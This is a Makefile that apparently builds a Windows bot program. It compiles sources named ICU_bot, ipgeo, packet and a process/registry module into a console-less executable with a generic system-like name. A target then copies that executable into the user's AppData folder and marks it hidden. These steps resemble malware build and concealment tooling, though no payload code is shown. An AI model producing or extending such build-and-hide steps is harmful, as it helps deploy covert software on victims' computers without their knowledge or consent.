OUT_DIR = source
APPDATA_DIR := $(shell cmd /C echo %APPDATA%)
HOME := $(shell git rev-parse --show-toplevel)

SRC_MAIN = x86_x64.c
SRC_BOT = core/ICU_bot.c
SRC_IPGEO = stdlib/ICU_ipgeo.c
SRC_PACKET = stdlib/ICU_packet.c
SRC_WIN_REESTR = process/windowsprocess.c

MAIN_OUT = $(OUT_DIR)/windows-x86_x64.exe
APPDATA_OUT = $(APPDATA_DIR)

CC = gcc
CFLAGS = -mwindows
LDFLAGS = -lws2_32
HTTPFLAGS = -lwinhttp
LAPIFLAGS = -liphlpapi

LIB_SDL = C:\SDL3\x86_64-w64-mingw32\lib
INCLUDE_SDL = C:\SDL3\x86_64-w64-mingw32\include

exe: $(MAIN_OUT)

$(MAIN_OUT): $(SRC_MAIN)
	@if not exist $(OUT_DIR) mkdir $(OUT_DIR)
	$(CC) $(SRC_MAIN) -o $(MAIN_OUT) $(SRC_BOT) $(SRC_IPGEO) $(SRC_PACKET) $(SRC_WIN_REESTR) $(CFLAGS) $(LDFLAGS) $(HTTPFLAGS) $(LAPIFLAGS)

appdata_c:
	copy /Y "$(HOME)\.sys\windows\source\windows-x86_x64.exe" "$(APPDATA_OUT)"
	attrib +h "$(APPDATA_OUT)\windows-x86_x64.exe"
appdata_d:
	del /Q "$(APPDATA_OUT)\windows-x86_x64.exe"

clean:
	rm -f $(EXE_OUT) $(DLL_OUT)
